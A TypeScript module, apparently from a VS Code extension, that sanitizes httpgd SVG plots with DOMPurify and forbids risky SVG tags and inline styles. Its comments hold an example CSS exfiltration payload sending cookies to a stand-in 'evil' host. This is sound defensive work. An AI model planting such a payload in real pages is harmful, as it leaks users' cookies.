import DOMPurifyDefault from 'dompurify';
import type { DOMPurify } from 'dompurify';

/**
 * Resolve a usable DOMPurify instance.
 *
 * In the webview (real browser context), the default export is already
 * initialized against `window` — `.sanitize` is callable directly.
 *
 * In Bun + jsdom tests (no real browser), the default export is the
 * factory: a function that takes a `WindowLike` and returns the
 * initialized instance. We detect that and invoke it with the global
 * `window` the test setup installs.
 *
 * Resolved once and memoized so we don't re-invoke the factory on
 * every call.
 */
let _dompurify: DOMPurify | null = null;
function get_dompurify(): DOMPurify {
    if (_dompurify) return _dompurify;
    const candidate = DOMPurifyDefault as unknown as
        | DOMPurify
        | ((root: unknown) => DOMPurify);
    if (typeof (candidate as DOMPurify).sanitize === 'function') {
        _dompurify = candidate as DOMPurify;
    } else if (typeof candidate === 'function') {
        const win = (globalThis as { window?: unknown }).window ?? globalThis;
        _dompurify = (candidate as (root: unknown) => DOMPurify)(win);
    } else {
        throw new Error('sanitize_svg: could not resolve a DOMPurify instance');
    }
    return _dompurify;
}

/**
 * Sanitize an SVG document fetched from httpgd before injecting it into
 * the webview via `{@html ...}`. Inline SVG content lives in the same
 * document as the webview's CSS, so a malicious R user emitting
 * `<script>`, event-handler attributes, or CSS-exfiltration vectors
 * could exploit the webview if the content reached the DOM unfiltered.
 *
 * Threat model: the user runs R code; an R session can already exfil
 * data or RCE on the host, so this is defense-in-depth, not a primary
 * security boundary. Still, the cost is low and the value is real.
 *
 * Configuration choices (kept in lockstep with the spec at
 * `docs/superpowers/specs/2026-05-25-plot-viewer-vscode-theme-toggle-design.md`,
 * §Sanitization):
 *
 *  - `USE_PROFILES: { svg: true, svgFilters: true }`: enable the SVG and
 *    SVG-filter element/attribute allowlists. Default profile would
 *    pass HTML elements through, which we don't want.
 *
 *  - `FORBID_TAGS`: deny five SVG-profile-permitted elements httpgd
 *    never emits but which carry real attack surface:
 *      - `<use>` / `<image>` / `<feImage>`: can reference external
 *        resources via href / xlink:href.
 *      - `<a>`: SVG-specific click semantics interfere with the right-
 *        click → Copy contextmenu handler on the plot host div.
 *      - `<style>`: CSS-exfiltration via `@import url(...)` — the
 *        sister channel to inline `style=` attrs.
 *      - `<foreignObject>`: hosts arbitrary HTML inside SVG, far wider
 *        attack surface than SVG itself.
 *
 *  - `FORBID_ATTR: ['style']`: the load-bearing line. The panel CSP
 *    keeps `style-src 'unsafe-inline'` (required for Svelte scoped
 *    styles), so a `<rect style="background:url(//evil/?cookie)">`
 *    could exfiltrate via CSS request. httpgd uses inline `fill=` /
 *    `stroke=` attributes, not `style="..."`, so this costs nothing.
 *
 *  - We intentionally do NOT add `class` / `xmlns` / `viewBox` to
 *    `ADD_ATTR`. The SVG profile already preserves them by default;
 *    adding them was a misleading "forward-compat" claim in an earlier
 *    spec revision. The real guard against a future DOMPurify profile
 *    change is the regression test in
 *    `tests/bun/plot-webview-sanitize.test.ts` asserting that
 *    `<svg class="httpgd">` survives sanitization with class and
 *    viewBox intact.
 *
 * Pinned to dompurify@3.4.5 — record the version in
 * `editors/vscode/package.json` (NOT the root) so an unintended bump
 * can't silently relax these protections.
 */
export function sanitize_svg(text: string): string {
    const out = get_dompurify().sanitize(text, {
        USE_PROFILES: { svg: true, svgFilters: true },
        FORBID_TAGS: ['use', 'image', 'a', 'style', 'foreignObject', 'feImage'],
        FORBID_ATTR: ['style'],
    });
    // DOMPurify's `sanitize` can return a TrustedHTML object on
    // platforms with Trusted Types; coerce to string so the caller's
    // `{@html}` consumer always receives a primitive.
    return typeof out === 'string' ? out : String(out);
}
